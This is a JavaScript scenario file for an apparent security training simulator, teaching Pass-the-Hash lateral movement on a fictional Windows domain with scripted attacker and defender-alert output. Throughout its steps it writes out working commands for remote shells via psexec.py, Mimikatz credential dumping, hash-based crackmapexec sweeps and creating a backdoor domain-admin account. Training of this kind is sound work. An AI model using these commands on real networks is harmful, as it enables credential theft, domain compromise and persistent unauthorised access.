/**
 * Pass-the-Hash (PtH) Attack Scenario
 *
 * This scenario simulates the Pass-the-Hash attack, where an attacker uses
 * stolen NTLM hashes to authenticate without knowing the plaintext password.
 *
 * THIS SCENARIO ASSUMES:
 * 1. `sqlservice:P@ssw0rd123!` credentials were stolen from Kerberoasting.
 * 2. `BH.zip` analysis from BloodHound revealed `sqlservice` is admin on `SQL01` (10.0.1.20).
 */

export const pthScenario = {
  id: 'pass-the-hash',
  title: 'Pass-the-Hash: Lateral Movement',
  description: 'Learn how attackers use stolen NTLM hashes to move laterally through the network.',

  network: {
    attacker: {
      ip: '10.0.0.5',
      hostname: 'kali-attacker',
      role: 'Red Team Machine'
    },
    target: {
      // NOTE: The 'target' for this scenario is the DC (10.0.1.10),
      // but the *first hop* is SQL01 (10.0.1.20).
      ip: '10.0.1.10',
      hostname: 'DC01.contoso.local',
      role: 'Domain Controller'
    },
    domain: 'contoso.local'
  },

  guide: {
    overview: `**Pass-the-Hash (PtH)** is a lateral movement technique that uses stolen NTLM password hashes to authenticate to other systems.

**Attack Flow:**
1. Use compromised 'sqlservice' credentials to gain a shell on the 'SQL01' server.
2. Dump NTLM hashes from 'SQL01' memory using Mimikatz.
3. Identify the 'Administrator' hash.
4. Use the 'Administrator' hash to "Pass-the-Hash" to the Domain Controller.
5. Establish persistence on the new system.

**Why This Matters:**
PtH bypasses password requirements. By compromising one machine, attackers can dump hashes from memory and use them to hop to other machines, escalating privileges as they go.`,

    steps: [
      {
        number: 1,
        title: 'Gain Initial Shell',
        description: 'Use the "sqlservice" credentials (from Kerberoasting) to gain an administrative shell on the "SQL01" server (10.0.1.20) using psexec.py.',
        command: 'psexec.py contoso.local/sqlservice:P@ssw0rd123!@10.0.1.20',
        tip: 'Our BloodHound recon showed "sqlservice" is an admin on this server.'
      },
      {
        number: 2,
        title: 'Extract NTLM Hashes',
        description: 'Now that you are on the "SQL01" server, dump NTLM password hashes from memory using Mimikatz.',
        command: 'mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam"',
        tip: 'NTLM hashes are stored in the SAM database on Windows systems'
      },
      {
        number: 3,
        title: 'Identify Target Systems',
        description: 'You found the local Administrator hash. Use crackmapexec to see where else this hash works.',
        command: 'crackmapexec smb 10.0.1.0/24 -u admin -H 5f4dcc3b5aa765d61d8327deb882cf99',
        tip: 'The hash format is LM:NTLM, but the LM hash is often a blank placeholder.'
      },
      {
        number: 4,
        title: 'Move to Domain Controller',
        description: 'The hash works on the DC (10.0.1.10)! Use psexec.py *with the hash* to authenticate and get a shell.',
        command: 'psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99 admin@10.0.1.10',
        tip: 'The -hashes flag tells psexec.py to use the NTLM hash instead of a password.'
      },
      {
        number: 5,
        title: 'Establish Persistence',
        description: 'You are now on the Domain Controller. Create a backdoor or persistence mechanism.',
        command: 'net user backdoor P@ssw0rd123 /add && net localgroup administrators backdoor /add',
        tip: 'Persistence ensures continued access even if the original account is disabled'
      },
      {
        number: 6,
        title: 'Escalate Privileges',
        description: 'You have compromised a Domain Controller and established persistence.',
        command: null,
        tip: 'From here, you could perform a DCSync attack.'
      }
    ]
  },

  steps: [
    {
      id: 1,
      expectedCommand: 'psexec.py contoso.local/sqlservice:P@ssw0rd123!@10.0.1.20',
      attackerOutput: [
        '[*] Connecting to 10.0.1.20 (SQL01)...',
        '[*] Authenticating as contoso.local\\sqlservice...',
        '[+] Authentication successful',
        '[+] Connected to SQL01 as sqlservice',
        '[*] Creating service for remote execution...',
        '[+] Service created: PSEXESVC',
        '[+] Executing command shell...',
        '[+] Command shell established',
        'C:\\Windows\\System32> whoami',
        'contoso\\sqlservice',
        'C:\\Windows\\System32> hostname',
        'SQL01',
        '[+] Remote execution successful. You are on the SQL01 server.'
      ],
      serverOutput: [
        '[SMB] Connection from 10.0.0.5',
        '[SMB] User: sqlservice',
        '[SMB] Authentication: NTLM (Password)',
        '[SMB] Access: ADMIN$',
        '[SYSTEM] Service creation detected: PSEXESVC',
        '[SYSTEM] Remote command execution initiated',
        '[ALERT] Lateral movement detected - sqlservice account on SQL01'
      ],
      delay: 400
    },
    {
      id: 2,
      expectedCommand: 'mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam"',
      attackerOutput: [
        '[*] Starting Mimikatz on SQL01...',
        '[*] Requesting debug privilege...',
        '[+] Debug privilege obtained',
        '[*] Elevating token...',
        '[+] Token elevated to SYSTEM',
        '[*] Dumping SAM database...',
        '[+] SAM dump successful',
        '[+] Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::',
        '[+] Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::',
        '[+] svc_admin:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::',
        '[+] Total hashes extracted: 3'
      ],
      serverOutput: [
        '[SYSTEM] Process: mimikatz.exe started on SQL01',
        '[SECURITY] Debug privilege requested',
        '[SECURITY] Token elevation detected',
        '[SECURITY] SAM database access detected',
        '[ALERT] Credential dumping activity detected on SQL01'
      ],
      delay: 500
    },
    {
      id: 3,
      expectedCommand: 'crackmapexec smb 10.0.1.0/24 -u admin -H 5f4dcc3b5aa765d61d8327deb882cf99',
      attackerOutput: [
        '[*] Starting CrackMapExec SMB scan...',
        '[*] Scanning subnet: 10.0.1.0/24',
        '[*] Using hash authentication (Pass-the-Hash)',
        '[*] Scanning 10.0.1.10 (DC01)...',
        '[+] 10.0.1.10 - SMB signing: True',
        '[+] (Pwned!) VALID: admin:5f4dcc3b5aa765d61d8327deb882cf99',
        '[*] Scanning 10.0.1.20 (SQL01)...',
        '[+] 10.0.1.20 - SMB signing: False',
        '[+] (Pwned!) VALID: admin:5f4dcc3b5aa765d61d8327deb882cf99',
        '[*] Scanning 10.0.1.30 (FILE01)...',
        '[-] 10.0.1.30 - SMB signing: False',
        '[-] INVALID: admin:5f4dcc3b5aa765d61d8327deb882cf99',
        '[+] Scan complete - 2 systems accessible with admin hash'
      ],
      serverOutput: [
        '[SMB] Connection from 10.0.0.5 (NTLM auth)',
        '[SMB] User: admin (using hash)',
        '[SMB] Authentication successful on DC01',
        '[SMB] Share access: ADMIN$',
        '[AUDIT] Multiple SMB connections from 10.0.0.5 with admin account',
        '[ALERT] Potential lateral movement activity detected'
      ],
      delay: 600
    },
    {
      id: 4,
      expectedCommand: 'psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99 admin@10.0.1.10',
      attackerOutput: [
        '[*] Connecting to 10.0.1.10 (DC01)...',
        '[*] Using Pass-the-Hash authentication',
        '[*] Hash: 5f4dcc3b5aa765d61d8327deb882cf99',
        '[+] Authentication successful',
        '[+] Connected to DC01 as admin',
        '[*] Creating service for remote execution...',
        '[+] Service created: PSEXESVC',
        '[+] Executing command shell...',
        '[+] Command shell established',
        'C:\\Windows\\System32> whoami',
        'CONTOSO\\admin',
        'C:\\Windows\\System32> hostname',
        'DC01',
        '[+] Remote execution successful. You are on the Domain Controller!'
      ],
      serverOutput: [
        '[SMB] Connection from 10.0.0.5',
        '[SMB] User: admin',
        '[SMB] Authentication: NTLM (hash-based)',
        '[SMB] Access: ADMIN$',
        '[SYSTEM] Service creation detected: PSEXESVC',
        '[SYSTEM] Remote command execution initiated',
        '[ALERT] CRITICAL: Lateral movement to Domain Controller detected!'
      ],
      delay: 500
    },
    {
      id: 5,
      expectedCommand: 'net user backdoor P@ssw0rd123 /add && net localgroup administrators backdoor /add',
      attackerOutput: [
        '[*] Creating backdoor user account on DC01...',
        '[+] User created: backdoor',
        '[+] Password set: P@ssw0rd123',
        '[*] Adding backdoor to administrators group...',
        '[+] backdoor added to administrators',
        '[+] Persistence established on DC01',
        '[*] Backdoor account details:',
        '[+]   Username: backdoor',
        '[+]   Password: P@ssw0rd123',
        '[+]   Group: Administrators',
        '[+]   Persistence: Confirmed'
      ],
      serverOutput: [
        '[SYSTEM] User account created: backdoor',
        '[SYSTEM] Group membership changed: backdoor -> Administrators',
        '[AUDIT] New administrator account created on DC01',
        '[ALERT] CRITICAL: Persistence mechanism detected on Domain Controller'
      ],
      delay: 500
    },
    {
      id: 6,
      expectedCommand: null,
      attackerOutput: [
        '',
        '[+] ============================================',
        '[+] Pass-the-Hash Attack Summary',
        '[+] ============================================',
        '[+] Hashes Extracted: 3 (from SQL01)',
        '[+] Systems Scanned: 3',
        '[+] Systems Compromised: 2 (SQL01, DC01)',
        '[+] Backdoor Accounts Created: 1',
        '[+] Persistence: Established on DC01',
        '[+] ============================================',
        '[*] Next Steps:',
        '[*] 1. Use Domain Controller access to run DCSync',
        '[*] 2. Target KRBTGT account for Golden Tickets',
        '[*] 3. Establish domain-wide persistence',
        '',
        '[+] Lateral movement successful! 🎯'
      ],
      serverOutput: [
        '',
        '[ALERT] SECURITY INCIDENT DETECTED',
        '[ALERT] Lateral movement attack in progress',
        '[ALERT] Domain Controller compromised:',
        '[ALERT]   - DC01: admin account (PtH)',
        '[ALERT]   - DC01: backdoor account (persistence)',
        '[ALERT] Recommend immediate incident response:',
        '[ALERT]   1. Reset all user passwords',
        '[ALERT]   2. Disable compromised accounts',
        '[ALERT]   3. Scan for additional backdoors'
      ],
      delay: 400
    }
  ]
};

export default pthScenario;